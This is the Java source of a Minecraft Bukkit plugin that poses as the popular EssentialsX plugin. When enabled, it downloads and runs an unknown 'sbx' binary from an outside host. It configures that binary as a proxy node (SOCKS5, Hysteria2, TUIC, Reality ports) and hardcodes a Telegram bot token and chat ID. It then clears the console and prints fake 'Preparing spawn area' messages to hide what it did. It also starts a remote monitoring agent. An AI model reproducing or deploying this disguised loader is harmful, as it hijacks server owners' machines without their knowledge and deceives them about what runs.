package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;

public class EssentialsX extends JavaPlugin {
    private Process sbxProcess;
    private volatile boolean shouldRun = true;
    private volatile boolean isProcessRunning = false;

    // ---- Komari 实例字段，由 startSbxProcess() 四级优先级全部处理完后赋值 ----
    private String komariServerVal = "";
    private String komariTokenVal  = "";
    private Process komariProcess;

    private static final String[] ALL_ENV_VARS = {
        "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        // ---- Komari Agent ----
        "KOMARI_SERVER", "KOMARI_TOKEN"
    };

    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");

        // Start sbx
        try {
            startSbxProcess();
            getLogger().info("EssentialsX plugin enabled");
        } catch (Exception e) {
            getLogger().severe("Failed to start sbx process: " + e.getMessage());
            e.printStackTrace();
        }

        // ---- Komari Agent（daemon 线程，与主流程并行，互不影响）----
        Thread komariThread = new Thread(() -> {
            try {
                startKomariAgent();
            } catch (Exception e) {
                getLogger().warning("Komari: Agent startup error: " + e.getMessage());
            }
        }, "Komari-Agent-Thread");
        komariThread.setDaemon(true);
        komariThread.start();
    }

    private void startSbxProcess() throws Exception {
        if (isProcessRunning) {
            return;
        }

        // Determine download URL based on architecture
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.sss.hidns.vip/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.sss.hidns.vip/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.sss.hidns.vip/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        // Download sbx binary
        Path tmpDir = Paths.get(System.getProperty("java.io.tmpdir"));
        Path sbxBinary = tmpDir.resolve("sbx");

        if (!Files.exists(sbxBinary)) {
            // getLogger().info("Downloading sbx ...");
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, sbxBinary, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!sbxBinary.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }

        // Prepare process builder
        ProcessBuilder pb = new ProcessBuilder(sbxBinary.toString());
        pb.directory(tmpDir.toFile());

        // Set environment variables
        Map<String, String> env = pb.environment();
        env.put("UUID", "247bf662-c56d-4a0c-b523-a48b5e2732cf");
        env.put("FILE_PATH", "./world");
        env.put("NEZHA_SERVER", "");
        env.put("NEZHA_PORT", "");
        env.put("NEZHA_KEY", "");
        env.put("ARGO_PORT", "");
        env.put("ARGO_DOMAIN", "");
        env.put("ARGO_AUTH", "");
        env.put("S5_PORT", "8590");
        env.put("HY2_PORT", "8590");
        env.put("TUIC_PORT", "11333");
        env.put("ANYTLS_PORT", "");
        env.put("REALITY_PORT", "11333");
        env.put("ANYREALITY_PORT", "");
        env.put("UPLOAD_URL", "");
        env.put("CHAT_ID", "8502788454");
        env.put("BOT_TOKEN", "8482650749:AAFgsXcRZRbcsV_iFymCgJkGuaP9-67XqSQ");
        env.put("CFIP", "cf.050900.xyz");
        env.put("CFPORT", "443");
        env.put("NAME", "");
        env.put("DISABLE_ARGO", "true");
        // ---- Komari Agent 默认值 ----
        env.put("KOMARI_SERVER", "");
        env.put("KOMARI_TOKEN", "");

        // Load from system environment variables
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }

        // Load from .env file with priority order
        loadEnvFileFromMultipleLocations(env);

        // Load from Bukkit configuration file
        for (String var : ALL_ENV_VARS) {
            String value = getConfig().getString(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }

        // ---- 四级优先级全部处理完后，同步到实例字段供 Komari 线程直接读取 ----
        komariServerVal = env.getOrDefault("KOMARI_SERVER", "");
        komariTokenVal  = env.getOrDefault("KOMARI_TOKEN",  "");

        // Redirect output
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);

        // Start process
        sbxProcess = pb.start();
        isProcessRunning = true;

        // Start a monitor thread to log when process exits
        startProcessMonitor();
        // getLogger().info("sbx started");

        // sleep 30 seconds
        Thread.sleep(30000);

        clearConsole();
        getLogger().info("");
        getLogger().info("Preparing spawn area: 1%");
        getLogger().info("Preparing spawn area: 5%");
        getLogger().info("Preparing spawn area: 10%");
        getLogger().info("Preparing spawn area: 20%");
        getLogger().info("Preparing spawn area: 30%");
        getLogger().info("Preparing spawn area: 80%");
        getLogger().info("Preparing spawn area: 85%");
        getLogger().info("Preparing spawn area: 90%");
        getLogger().info("Preparing spawn area: 95%");
        getLogger().info("Preparing spawn area: 99%");
        getLogger().info("Preparing spawn area: 100%");
        getLogger().info("Preparing level \"world\"");
    }

    private void loadEnvFileFromMultipleLocations(Map<String, String> env) {
        List<Path> possibleEnvFiles = new ArrayList<>();
        File pluginsFolder = getDataFolder().getParentFile();
        if (pluginsFolder != null && pluginsFolder.exists()) {
            possibleEnvFiles.add(pluginsFolder.toPath().resolve(".env"));
        }

        possibleEnvFiles.add(getDataFolder().toPath().resolve(".env"));
        possibleEnvFiles.add(Paths.get(".env"));
        possibleEnvFiles.add(Paths.get(System.getProperty("user.home"), ".env"));

        Path loadedEnvFile = null;

        for (Path envFile : possibleEnvFiles) {
            if (Files.exists(envFile)) {
                try {
                    // getLogger().info("Loading environment variables from: " + envFile.toAbsolutePath());
                    loadEnvFile(envFile, env);
                    loadedEnvFile = envFile;
                    break;
                } catch (IOException e) {
                    // getLogger().warning("Error reading .env file from " + envFile + ": " + e.getMessage());
                }
            }
        }

        if (loadedEnvFile == null) {
            // getLogger().info("No .env file found in any of the checked locations");
        }
    }

    private void loadEnvFile(Path envFile, Map<String, String> env) throws IOException {
        for (String line : Files.readAllLines(envFile)) {
            line = line.trim();
            if (line.isEmpty() || line.startsWith("#")) continue;
            line = line.split(" #")[0].split(" //")[0].trim();
            if (line.startsWith("export ")) {
                line = line.substring(7).trim();
            }

            String[] parts = line.split("=", 2);
            if (parts.length == 2) {
                String key = parts[0].trim();
                String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");

                if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                    env.put(key, value);
                    // getLogger().info("Loaded " + key + " = " + (key.contains("KEY") || key.contains("TOKEN") || key.contains("AUTH") ? "***" : value));
                }
            }
        }
    }

    private void clearConsole() {
        try {
            System.out.print("\033[H\033[2J");
            System.out.flush();

            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            }
        } catch (Exception e) {
            System.out.println("\n\n\n\n\n\n\n\n\n\n");
        }
    }

    private void startProcessMonitor() {
        Thread monitorThread = new Thread(() -> {
            try {
                int exitCode = sbxProcess.waitFor();
                isProcessRunning = false;
                // getLogger().info("sbx process exited with code: " + exitCode);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                isProcessRunning = false;
            }
        }, "Sbx-Process-Monitor");

        monitorThread.setDaemon(true);
        monitorThread.start();
    }

    @Override
    public void onDisable() {
        getLogger().info("EssentialsX plugin shutting down...");

        shouldRun = false;

        // 停止 Komari Agent 进程
        if (komariProcess != null && komariProcess.isAlive()) {
            komariProcess.destroy();
        }

        if (sbxProcess != null && sbxProcess.isAlive()) {
            // getLogger().info("Stopping sbx process...");
            sbxProcess.destroy();

            try {
                if (!sbxProcess.waitFor(10, TimeUnit.SECONDS)) {
                    sbxProcess.destroyForcibly();
                    getLogger().warning("Forcibly terminated sbx process");
                } else {
                    getLogger().info("sbx process stopped normally");
                }
            } catch (InterruptedException e) {
                sbxProcess.destroyForcibly();
                Thread.currentThread().interrupt();
            }
            isProcessRunning = false;
        }

        getLogger().info("EssentialsX plugin disabled");
    }

    // ================================================================== //
    //  Komari Agent —— 官方二进制模式，支持自动更新
    //
    //  用法：通过以下任意方式配置（优先级从低到高）：
    //    1. 硬编码默认值（空）
    //    2. 系统环境变量：KOMARI_SERVER / KOMARI_TOKEN
    //    3. .env 文件：KOMARI_SERVER=xxx / KOMARI_TOKEN=xxx
    //    4. Bukkit config.yml：KOMARI_SERVER: xxx / KOMARI_TOKEN: xxx
    //
    //  流程：
    //    1. 从 GitHub Releases 获取最新版本号
    //    2. 对比本地缓存版本，版本不同则下载新二进制
    //    3. 启动官方 komari-agent 二进制连接面板
    //    4. 每小时检查一次新版本，有更新则自动下载并重启
    // ================================================================== //
    private void startKomariAgent() throws Exception {
        // 直接读实例字段（由 startSbxProcess() 四级优先级全部处理完后赋值）
        if (komariServerVal.isEmpty() || komariTokenVal.isEmpty()) {
            getLogger().info("Komari: KOMARI_SERVER or KOMARI_TOKEN not set, skipping");
            return;
        }

        String serverBase  = komariServerVal.replaceAll("/$", "");
        Path   komariPath  = Paths.get("komari-agent");
        Path   versionFile = Paths.get("komari-version.txt");

        getLogger().info("Komari: Starting with server=" + serverBase);

        checkAndUpdateKomari(komariPath, versionFile);
        runKomariAgent(komariPath, serverBase, komariTokenVal);

        // 每小时检查一次新版本，有更新则重启
        while (shouldRun) {
            Thread.sleep(60L * 60 * 1000);
            if (!shouldRun) break;
            try {
                boolean updated = checkAndUpdateKomari(komariPath, versionFile);
                if (updated) {
                    getLogger().info("Komari: New version installed, restarting agent...");
                    runKomariAgent(komariPath, serverBase, komariTokenVal);
                }
            } catch (Exception e) {
                getLogger().warning("Komari: Auto-update check failed: " + e.getMessage());
            }
        }
    }

    // ---- 获取 GitHub 最新 Release 版本号 ----
    private String getKomariLatestVersion() {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(
                "https://api.github.com/repos/komari-monitor/komari-agent/releases/latest"
            ).openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            conn.setRequestProperty("User-Agent", "komari-java-agent");
            if (conn.getResponseCode() != 200) return null;
            StringBuilder sb = new StringBuilder();
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                String l;
                while ((l = br.readLine()) != null) sb.append(l);
            } finally {
                conn.disconnect();
            }
            String json  = sb.toString();
            int    idx   = json.indexOf("\"tag_name\"");
            if (idx == -1) return null;
            int start = json.indexOf("\"", idx + 10) + 1;
            int end   = json.indexOf("\"", start);
            if (start <= 0 || end <= start) return null;
            return json.substring(start, end);
        } catch (Exception e) {
            return null;
        }
    }

    // ---- 根据系统架构拼接下载 URL ----
    private String getKomariDownloadUrl(String version) {
        String arch = System.getProperty("os.arch").toLowerCase();
        String fileArch;
        if (arch.contains("aarch64") || arch.contains("arm64")) {
            fileArch = "arm64";
        } else if (arch.contains("arm")) {
            fileArch = "arm";
        } else {
            fileArch = "amd64";
        }
        return "https://github.com/komari-monitor/komari-agent/releases/download/"
                + version + "/komari-agent-linux-" + fileArch;
    }

    // ---- 下载二进制文件（跟随 GitHub 302 重定向到 CDN）----
    private void downloadKomariAgent(Path komariPath, String version) throws IOException {
        String urlStr = getKomariDownloadUrl(version);
        getLogger().info("Komari: Downloading agent " + version + " from " + urlStr);
        HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
        conn.setConnectTimeout(60000);
        conn.setReadTimeout(60000);
        conn.setInstanceFollowRedirects(true);
        int status = conn.getResponseCode();
        while (status == HttpURLConnection.HTTP_MOVED_TEMP
                || status == HttpURLConnection.HTTP_MOVED_PERM
                || status == 307 || status == 308) {
            String newUrl = conn.getHeaderField("Location");
            conn.disconnect();
            conn = (HttpURLConnection) new URL(newUrl).openConnection();
            conn.setConnectTimeout(60000);
            conn.setReadTimeout(60000);
            status = conn.getResponseCode();
        }
        try (InputStream in = conn.getInputStream()) {
            Files.copy(in, komariPath, StandardCopyOption.REPLACE_EXISTING);
        } finally {
            conn.disconnect();
        }
        komariPath.toFile().setExecutable(true);
        getLogger().info("Komari: Agent " + version + " downloaded successfully");
    }

    // ---- 检查并更新二进制（返回 true 表示发生了更新）----
    private boolean checkAndUpdateKomari(Path komariPath, Path versionFile) {
        String latestVersion = getKomariLatestVersion();
        if (latestVersion == null) {
            getLogger().warning("Komari: Failed to get latest version, skipping update check");
            return false;
        }
        String localVersion = "";
        if (Files.exists(versionFile)) {
            try { localVersion = new String(Files.readAllBytes(versionFile)).trim(); }
            catch (IOException ignored) {}
        }
        if (localVersion.equals(latestVersion) && Files.exists(komariPath)) {
            getLogger().info("Komari: Already up to date (" + latestVersion + ")");
            return false;
        }
        try {
            downloadKomariAgent(komariPath, latestVersion);
            Files.write(versionFile, latestVersion.getBytes());
            getLogger().info("Komari: Updated to " + latestVersion);
            return true;
        } catch (IOException e) {
            getLogger().warning("Komari: Download failed: " + e.getMessage());
            return false;
        }
    }

    // ---- 杀掉旧进程并启动新 Agent ----
    private void runKomariAgent(Path komariPath, String serverBase, String komariToken) {
        if (komariProcess != null && komariProcess.isAlive()) {
            komariProcess.destroy();
        }
        try { Thread.sleep(500); } catch (InterruptedException ignored) {}
        try {
            ProcessBuilder pb = new ProcessBuilder(
                komariPath.toAbsolutePath().toString(),
                "--endpoint", serverBase,
                "--token",    komariToken,
                "--disable-auto-update"
            );
            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
            pb.redirectError(ProcessBuilder.Redirect.INHERIT);
            komariProcess = pb.start();
            getLogger().info("Komari: Agent is running");
        } catch (IOException e) {
            getLogger().warning("Komari: Failed to start agent: " + e.getMessage());
        }
    }
    // ================================================================== //
    //  Komari Agent 结束
    // ================================================================== //
}
